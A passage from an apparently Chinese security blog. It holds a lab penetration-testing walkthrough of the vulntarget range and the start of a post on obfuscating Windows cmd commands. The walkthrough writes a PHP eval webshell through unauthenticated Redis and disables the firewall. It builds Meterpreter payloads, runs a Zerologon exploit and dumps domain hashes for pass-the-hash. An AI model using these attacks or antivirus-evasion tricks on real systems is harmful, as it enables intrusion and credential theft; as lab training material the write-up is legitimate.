(50% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 158 of 256 hosts (61% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 180 of 256 hosts (70% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 207 of 256 hosts (80% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 233 of 256 hosts (91% complete)</span><br><span class="line">[*] 10.0.20.0&#x2F;24:         - Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>扫到两台机器  98是拿到的外网win7  99是这个网段的另一台机器</p>
<br>

<p>这里设置个代理(之前我都是手动去配路由 没用过这个在msf session中自动配的  然后就手动去配的 结果都是启动就结束 然后我自己再去proxychain 连127.0.0.1:1080发现自动路由那里已经给配置好了…) </p>
<br>

<h3 id="横向第二台机器"><a href="#横向第二台机器" class="headerlink" title="横向第二台机器"></a>横向第二台机器</h3><p>99这台机器开放了80端口和6379端口 可测试下是否存在redis未授权</p>
<p>先用dirb 去扫一下80端口的目录 dirb太慢了 没打扫到啥换dirsearch </p>
<p><code>proxychain python3 dirsearch.py -u http://10.0.20.99</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">403   225B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;Trace.axd::$DATA</span><br><span class="line">200    11B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;index.php</span><br><span class="line">200    11B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;index.pHp</span><br><span class="line">200    11B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;index.php.</span><br><span class="line">200    11B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;index.php&#x2F;login&#x2F;</span><br><span class="line">403   225B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;index.php::$DATA</span><br><span class="line">200    14KB  http:&#x2F;&#x2F;10.0.20.99:80&#x2F;l.php</span><br><span class="line">200    70KB  http:&#x2F;&#x2F;10.0.20.99:80&#x2F;phpinfo.php</span><br><span class="line">403   226B   http:&#x2F;&#x2F;10.0.20.99:80&#x2F;web.config::$DATA</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>只有l.php 和 phpinfo有点信息 l.php是一个探针</p>
<p><img src="/posts/3edb83f3/6.png" alt="截图"></p>
<p><img src="/posts/3edb83f3/7.png" alt="截图"></p>
<p>通过探针可用发现是使用phpstudy搭建的，绝对路径为<code> C:/phpStudy/PHPTutorial/WWW</code> </p>
<h5 id="CS建立socks4代理"><a href="#CS建立socks4代理" class="headerlink" title="CS建立socks4代理"></a>CS建立socks4代理</h5><p>这里也可以使用cs的代理去访问web服务</p>
<p>右键拿到权限的主机 —&gt; Pivoting —&gt; Socks Server</p>
<p>然后会生成一个随机未占用的端口，点击启动即可</p>
<p><img src="/posts/3edb83f3/8.png" alt="截图"></p>
<p>然后使用代理 连接 socks4 CSip 和这个端口即可</p>
<p>（也可以使用前面msf起的代理）</p>
<br>

<h4 id="Redis未授权getshell"><a href="#Redis未授权getshell" class="headerlink" title="Redis未授权getshell"></a>Redis未授权getshell</h4><p>没啥利用点，那就去考虑 6379的redis了</p>
<p><code>proxychains redis-cli -h 10.0.20.99</code> 发现未授权</p>
<p>可直接写一个webshell 然后去连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set webshell &quot;&lt;?php @eval($_REQUEST[&#39;ant&#39;]);?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; </span><br></pre></td></tr></table></figure>

<p>能写入但是没法连上蚁剑… … </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.0.20.99:6379&gt; config set dir &quot;C:&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; config set dbfilename info.php</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">OK</span><br><span class="line">10.0.20.99:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p>写一个phpinfo也没啥问题 那基本可以确定是蚁剑代理的问题了</p>
<p><img src="/posts/3edb83f3/9.png" alt="截图"></p>
<br>

<p>使用蚁剑自身代理没连上，使用socksCap也没连上，使用proxifier就成功连上了….</p>
<p><img src="/posts/3edb83f3/10.png" alt="截图"></p>
<br>

<p><code>whomai </code> 得到也是system权限</p>
<p><code>systeminfo</code>  得到域信息和两张网卡</p>
<p><img src="/posts/3edb83f3/11.png" alt="截图"></p>
<p>域名为 <code>vulntarget.com</code>  一张网卡为 <code>10.0.20.0/24</code> 属于dmz区的网段</p>
<p>然后<code>10.0.10.0/24</code> 基本上可以判定为是域网段</p>
<p>然后查一下杀软 <code>tasklist -svc</code></p>
<p><img src="/posts/3edb83f3/12.png" alt="截图"></p>
<p>存在WinDef</p>
<p>生成一个马 再还没被杀的时候 也连不上，估计是开了防火墙</p>
<p><code>netsh advfirewall show allprofiles</code> 查看防火墙状态</p>
<p><img src="/posts/3edb83f3/13.png" alt="截图"></p>
<p>一顿乱码，先去改一下编码方式 改成gbk后就可以了</p>
<p><img src="/posts/3edb83f3/14.png" alt="截图"></p>
<br>

<p><code>netsh advfirewall set allprofiles state off</code> 关闭防火墙(这里是system权限 直接就可关闭)</p>
<p><img src="/posts/3edb83f3/15.png" alt="截图"></p>
<br>

<h4 id="CS端口转发尝试上线win2016"><a href="#CS端口转发尝试上线win2016" class="headerlink" title="CS端口转发尝试上线win2016"></a>CS端口转发尝试上线win2016</h4><p>然后尝试使用之前的外网win7的cs beacon 代理连到win2016上</p>
<p>使用端口转发 右键win7beacon —&gt; pivoting —&gt; Listener … —&gt;</p>
<p><img src="/posts/3edb83f3/16.png" alt="截图"></p>
<p>然后保存后会在listeners中生成这个通过win7做代理的listner</p>
<p>然后去上马，但是上去就会被WinDef给杀掉….. 卡住了昂</p>
<br>

<h4 id="msf上线win2016"><a href="#msf上线win2016" class="headerlink" title="msf上线win2016"></a>msf上线win2016</h4><h5 id="反向马上线失败了"><a href="#反向马上线失败了" class="headerlink" title="反向马上线失败了"></a>反向马上线失败了</h5><p>这里ip为win7的内网IP</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop]</span><br><span class="line">└─$ msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;10.0.20.98 lport&#x3D;4444 -f exe &gt; sl.exe   </span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of exe file: 73802 bytes</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">[*] Using configured payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.20.98:5555 via the meterpreter on session 2</span><br><span class="line">                                       </span><br></pre></td></tr></table></figure>

<p>然后卡住了</p>
<br>

<h5 id="使用正向马-成功上线"><a href="#使用正向马-成功上线" class="headerlink" title="使用正向马 成功上线"></a>使用正向马 成功上线</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop]</span><br><span class="line">└─$ msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp lport&#x3D;6666 -f exe &gt; 6666.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 496 bytes</span><br><span class="line">Final size of exe file: 7168 bytes</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set rhost 10.0.20.99</span><br><span class="line">rhost &#x3D;&gt; 10.0.20.99</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lport 6666</span><br><span class="line">lport &#x3D;&gt; 6666</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started bind TCP handler against 10.0.20.99:6666</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.0.20.99</span><br><span class="line">[*] Meterpreter session 3 opened (10.0.20.98:53533 -&gt; 10.0.20.99:6666) at 2022-03-22 05:46:01 -0400</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WIN2016</span><br><span class="line">OS              : Windows 2016+ (10.0 Build 14393).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : VULNTARGET</span><br><span class="line">Logged On Users : 4</span><br><span class="line">Meterpreter     : x64&#x2F;windows</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line"></span><br><span class="line">meterpreter &gt; arp</span><br><span class="line"></span><br><span class="line">ARP cache</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    IP address       MAC address        Interface</span><br><span class="line">    ----------       -----------        ---------</span><br><span class="line">    10.0.10.110      00:0c:29:be:1e:f6  12</span><br><span class="line">    10.0.10.255      ff:ff:ff:ff:ff:ff  12</span><br><span class="line">    10.0.20.98       00:0c:29:f6:6a:0f  9</span><br><span class="line">    10.0.20.255      ff:ff:ff:ff:ff:ff  9</span><br><span class="line">    224.0.0.22       00:00:00:00:00:00  1</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  9</span><br><span class="line">    224.0.0.22       01:00:5e:00:00:16  12</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  9</span><br><span class="line">    224.0.0.252      01:00:5e:00:00:fc  12</span><br><span class="line">    239.255.255.250  00:00:00:00:00:00  1</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  9</span><br><span class="line">    239.255.255.250  01:00:5e:7f:ff:fa  12</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>现在已经得到域内ip段为 <code>10.0.10.0/24</code></p>
<p>然后定位域控</p>
<p><code>run post/windows/gather/enum_domain</code></p>
<p>得到域控为DC名 <code>win2019</code>  IP<code>10.0.10.110</code> 域名 <code>vulntarget</code></p>
<p><img src="/posts/3edb83f3/17.png" alt="截图"></p>
<br>

<p>再添加一个win2016的路由</p>
<p><code>meterpreter &gt; run post/multi/manage/autoroute </code></p>
<p><img src="/posts/3edb83f3/18.png" alt="截图"></p>
<br>

<h3 id="域控win2016"><a href="#域控win2016" class="headerlink" title="域控win2016"></a>域控win2016</h3><h4 id="端口扫描-1"><a href="#端口扫描-1" class="headerlink" title="端口扫描"></a>端口扫描</h4><p>这里为了节省时间就扫几个端口了 不然太慢了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop]</span><br><span class="line">└─$ proxychains nmap -Pn -sT 10.0.10.110 -p6379,80,8080,445,139    148 ⨯ 1 ⚙</span><br><span class="line">[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf</span><br><span class="line">[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Starting Nmap 7.92 ( https:&#x2F;&#x2F;nmap.org ) at 2022-03-22 06:19 EDT</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:8080 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:139  ...  OK</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:80 &lt;--socket error or timeout!</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">RTTVAR has grown to over 2.3 seconds, decreasing to 2.0</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:6379 &lt;--socket error or timeout!</span><br><span class="line">Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan</span><br><span class="line">Connect Scan Timing: About 100.00% done; ETC: 06:20 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 10.0.10.110</span><br><span class="line">Host is up (12s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE  SERVICE</span><br><span class="line">80&#x2F;tcp   closed http</span><br><span class="line">139&#x2F;tcp  open   netbios-ssn</span><br><span class="line">445&#x2F;tcp  open   microsoft-ds</span><br><span class="line">6379&#x2F;tcp closed redis</span><br><span class="line">8080&#x2F;tcp closed http-proxy</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 45.54 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="CVE-2020-1472（置空密码"><a href="#CVE-2020-1472（置空密码" class="headerlink" title="CVE-2020-1472（置空密码)"></a>CVE-2020-1472（置空密码)</h4><p>没啥可以了利用的地方，然后看了下 其他师傅的文章</p>
<p>这里用到了 域内提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop]</span><br><span class="line">└─$ proxychains python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110     1 ⨯</span><br><span class="line">[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf</span><br><span class="line">[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Performing authentication attempts...</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Target vulnerable, changing account password to empty string</span><br><span class="line"></span><br><span class="line">Result: 0</span><br><span class="line"></span><br><span class="line">Exploit complete!</span><br><span class="line">                                                                             </span><br><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop]</span><br><span class="line">└─$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后密码被置空了</p>
<h4 id="使用impactet"><a href="#使用impactet" class="headerlink" title="使用impactet"></a>使用impactet</h4><p>使用 <code>secretsdump.py</code> dump hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;impacket&#x2F;impacket-0.9.24&#x2F;examples]</span><br><span class="line">└─$ proxychains python3 secretsdump.py  vulntarget.com&#x2F;WIN2019\$@10.0.10.110  -just-dc  -no-pass  </span><br><span class="line">[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf</span><br><span class="line">[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:135  ...  OK</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:49673  ...  OK</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a3dd8e4a352b346f110b587e1d1d1936:::</span><br><span class="line">vulntarget.com\win2016:1601:aad3b435b51404eeaad3b435b51404ee:dfc8d2bfa540a0a6e2248a82322e654e:::</span><br><span class="line">WIN2019$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WIN2016$:1602:aad3b435b51404eeaad3b435b51404ee:f835118efec7ef06133c3f228e69e554:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">Administrator:aes256-cts-hmac-sha1-96:70a1edb09dbb1b58f1644d43fa0b40623c014b690da2099f0fc3a8657f75a51d</span><br><span class="line">Administrator:aes128-cts-hmac-sha1-96:04c435638a00755c0b8f12211d3e88a1</span><br><span class="line">Administrator:des-cbc-md5:dcc29476a789ec9e</span><br><span class="line">krbtgt:aes256-cts-hmac-sha1-96:f7a968745d4f201cbeb73f4b1ba588155cfd84ded34aaf24074a0cfe95067311</span><br><span class="line">krbtgt:aes128-cts-hmac-sha1-96:f401ac35dc1c6fa19b0780312408cded</span><br><span class="line">krbtgt:des-cbc-md5:10efae67c7026dbf</span><br><span class="line">vulntarget.com\win2016:aes256-cts-hmac-sha1-96:e4306bef342cd8215411f9fc38a063f5801c6ea588cc2fee531342928b882d61</span><br><span class="line">vulntarget.com\win2016:aes128-cts-hmac-sha1-96:6da7e9e046c4c61c3627a3276f5be855</span><br><span class="line">vulntarget.com\win2016:des-cbc-md5:6e2901311c32ae58</span><br><span class="line">WIN2019$:aes256-cts-hmac-sha1-96:092c877c3b20956347d535d91093bc1eb16b486b630ae2d99c0cf15da5db1390</span><br><span class="line">WIN2019$:aes128-cts-hmac-sha1-96:0dca147d2a216089c185d337cf643e25</span><br><span class="line">WIN2019$:des-cbc-md5:01c8894f541023bc</span><br><span class="line">WIN2016$:aes256-cts-hmac-sha1-96:f53f26ac32375f204b39a10dbe054714ac57f4ed1604e522db5b2ab51d719760</span><br><span class="line">WIN2016$:aes128-cts-hmac-sha1-96:1deb3de2d7567fd69e91c14c3dff8ce7</span><br><span class="line">WIN2016$:des-cbc-md5:c44cbff1e3153e85</span><br><span class="line">[*] Cleaning up... </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到administrator的hash值 <code>aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15</code> </p>
<p>使用 smbexec 通过administrator的hash连接cmd 拿到域控的cmd</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~&#x2F;Desktop&#x2F;impacket&#x2F;impacket-0.9.24&#x2F;examples]</span><br><span class="line">└─$ proxychains python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110  </span><br><span class="line">[proxychains] config file found: &#x2F;etc&#x2F;proxychains4.conf</span><br><span class="line">[proxychains] preloading &#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.0.10.110:445  ...  OK</span><br><span class="line">[!] Launching semi-interactive shell - Careful what you execute</span><br><span class="line">C:\Windows\system32&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p><img src="/posts/3edb83f3/19.png" alt="截图"></p>
<br>

<p>破解hash 去得到域控的登录密码</p>
<p>得到密码为 Admin@666</p>
<br>

<h4 id="然后开启3389远程桌面"><a href="#然后开启3389远程桌面" class="headerlink" title="然后开启3389远程桌面"></a>然后开启3389远程桌面</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3389 &#x2F;f</span><br><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/posts/3edb83f3/20.png" alt="截图"></p>
<br>

<p><code>proxychains rdesktop 10.0.10.110</code></p>
<br>

<p><img src="/posts/3edb83f3/21.png" alt="截图"></p>
<p>没连上…  根据报错查了下解决方法：<br>进入windows系统，在“远程桌面”中，将“仅允许使用网络级别身份验证的远程桌面的计算机连接（建议）”勾选去除即可。</p>
<p>貌似只有这样才能用rdesktop登录</p>
<p>然后找了另一种方法 下载<code>remmina</code> </p>
<p><code>sudo apt install remmina</code></p>
<p><img src="/posts/3edb83f3/22.png" alt="截图"></p>
<p>然后成功登录到域控的远程桌面</p>
<p><img src="/posts/3edb83f3/23.png" alt="截图"></p>
<br>

<p>这靶场从开始到现在 搞了快一天了 好多东西都忘记怎么用了，当然也学了些新东西 还是有些收获的。明天再回顾下，然后尝试下koadic </p>
]]></content>
  </entry>
  <entry>
    <title>cmd命令混淆</title>
    <url>/posts/bac18dc8/</url>
    <content><![CDATA[<p>现在杀软大都是底层防御，直接混淆cmd没啥用，这里的话主要是学一下思路</p>
<h3 id="CMD命令符号"><a href="#CMD命令符号" class="headerlink" title="CMD命令符号"></a>CMD命令符号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@:隐藏命令的回显。</span><br><span class="line">~:变量扩展或者扩展环境变量指定位置的字符串。</span><br><span class="line">%:引用环境变量或者单个%表示引用命令行参数。</span><br><span class="line">^:取消转义字符。</span><br><span class="line">&amp;:命令连接字符。</span><br><span class="line">： 管道符，将上一个命令的输出,作为下一个命令的输入。</span><br><span class="line">:： 标签符,接受goto命令所指向的标签。</span><br><span class="line">”“:界定符,使用带有空格的路径时用”“将路径括起来。</span><br><span class="line">&#x2F;: 其后的字符是命令的功能开关。</span><br><span class="line">&gt;: 命令重定向符，输入在前，输出在后，覆盖之前的内容。</span><br><span class="line">&gt;&gt;: 命令重定向符。输入在前，输出在后，不覆盖之前的内容。</span><br><span class="line">&lt;:将后面文件的内容输出到前面。</span><br><span class="line">&#x3D; :赋值符号,用于变量赋值。</span><br><span class="line">\ :当前路径所在的根路径。</span><br><span class="line">&amp;&amp; :连接两个命令,&amp;&amp;前的命令成功时,才执行&amp;&amp;后的命令。</span><br><span class="line"> 	：连接两个命令,	 	前的命令失败时,才执行	 	后的命令。</span><br><span class="line">$:findstr命令中表示一行的结束。</span><br><span class="line">&#96;&#96;:for&#x2F;f中表示它们所包含的内容当作命令行执行并分析它的输出。</span><br><span class="line">!: 延迟变量,使用!!将变量名扩起来表示对变量值的引用。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<h3 id="大小写-特殊字符混淆"><a href="#大小写-特殊字符混淆" class="headerlink" title="大小写/特殊字符混淆"></a>大小写/特殊字符混淆</h3><p>cmd中大小写不敏感 可以大小写执行命令</p>
<p><img src="/posts/bac18dc8/1.png" alt="截图"></p>
<h3 id="特殊字符混淆"><a href="#特殊字符混淆" class="headerlink" title="特殊字符混淆"></a>特殊字符混淆</h3><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01 ^"></a>0x01 ^</h4><p><code>^</code>是cmd中常见的转义字符 不会影响命令的正常执行。</p>
<p><img src="/posts/bac18dc8/2.png" alt="截图"></p>
<h4 id="0x02-“”拼接"><a href="#0x02-“”拼接" class="headerlink" title="0x02 “”拼接"></a>0x02 “”拼接</h4><p><img src="/posts/bac18dc8/3.png" alt="截图"></p>
<h4 id="0x03-替换空格"><a href="#0x03-替换空格" class="headerlink" title="0x03  , ;替换空格"></a>0x03  , ;替换空格</h4><p><img src="/posts/bac18dc8/4.png" alt="截图"></p>
<p>但是这个插入<code>net user</code>不会成功</p>
<h4 id="0x04-（）"><a href="#0x04-（）" class="headerlink" title="0x04 （）"></a>0x04 （）</h4><p><img src="/posts/bac18dc8/5.png" alt="截图"></p>
<br>

<br>

<h3 id="利用环境变量混淆"><a href="#利用环境变量混淆" class="headerlink" title="利用环境变量混淆"></a>利用环境变量混淆</h3><h4 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h4><p>在cmd下使用<code>set</code> 可以列举出cmd中的所有环境变量 一般使用<code>set a=who</code>这种的都是临时变量 重启后便不会存在  一般使用call命令来调用拓展变量</p>
<p><img src="/posts/bac18dc8/6.png" alt="截图"></p>
<p>（<code>cmd /c &quot;string&quot; 表示执行字符串string执行的命令 然后终止</code>  可以通过 <code>cmd /?</code> 查看cmd下的详细命令）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Users\TEST&gt;cmd &#x2F;c &quot;set var1&#x3D;ser&amp;&amp;set var2&#x3D;ne&amp;&amp;set var3&#x3D;t u&amp;&amp;call  %var2%%var3</span><br><span class="line">%%var1%&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bac18dc8/7.png" alt="截图"></p>
<br>

<h5 id="记一个小坑"><a href="#记一个小坑" class="headerlink" title="记一个小坑"></a>记一个小坑</h5><p>记一个小坑<br><code>set t=&quot;am&quot; &amp;&amp; who%t%i  </code> 多次执行只成功一次 不知道为什么..后续再运行 命令都失败了<br>直接<code>echo %t%</code>  得到为 <code>&quot;am&quot;</code><br><img src="/posts/bac18dc8/8.png" alt="截图"></p>
<p>尝试了下 发现这里可以不用去加双引号空格这类的 不然会被分隔开 但是第一次能执行也不知道是为啥，但是后面使用<code>call</code> 便可以执行环境变量的命令</p>
<h4 id="0x02-cmd-V-ON-启用延迟环境变量拓展"><a href="#0x02-cmd-V-ON-启用延迟环境变量拓展" class="headerlink" title="0x02 cmd /V:ON 启用延迟环境变量拓展"></a>0x02 cmd /V:ON 启用延迟环境变量拓展</h4><p>当启用 <code>/V：ON</code> 后 使用 <code>%var% </code>或 <code>!var! </code>来扩展变量，<code>!var!</code>可以用来代替<code>%var%</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd &#x2F;c &quot;set var1&#x3D;ser&amp;&amp;set var2&#x3D;ne&amp;&amp;set var3&#x3D;t u&amp;&amp;call  %var2%%var3</span><br><span class="line">%%var1%&quot;</span><br><span class="line">cmd &#x2F;V:ON &#x2F;c &quot;set var1&#x3D;ser&amp;&amp;set var2&#x3D;ne&amp;&amp;set var3&#x3D;t u&amp;&amp;call  !var2</span><br><span class="line">!!var3!!var1!</span><br></pre></td></tr></table></figure>

<p><img src="/posts/bac18dc8/9.png" alt="截图"></p>
<h4 id="0x03-通过截取环境变量"><a href="#0x03-通过截取环境变量" class="headerlink" title="0x03 通过截取环境变量"></a>0x03 通过截取环境变量</h4><p>通过<code>set </code> 查看当前的环境变量</p>
<p><code>%comspec%</code> 值的结果为 <code>C:\Windows\system32\cmd.exe</code> </p>
<p>可以通过截取后面部分去调用cmd 格式为<code>%VarName:~offset[,length]%</code> 然后就可以根据环境变量去拼接出想要执行的命令</p>
<p><img src="/posts/bac18dc8/10.png"></p>
<br>

<h3 id="使用for循环拼接命令"><a href="#使用for循环拼接命令" class="headerlink" title="使用for循环拼接命令"></a>使用for循环拼接命令</h3><p>cmd中除了set命令歪 还有 ftype、assoc等命令</p>
<p><code>assoc</code> 文件名拓展关联命令 </p>
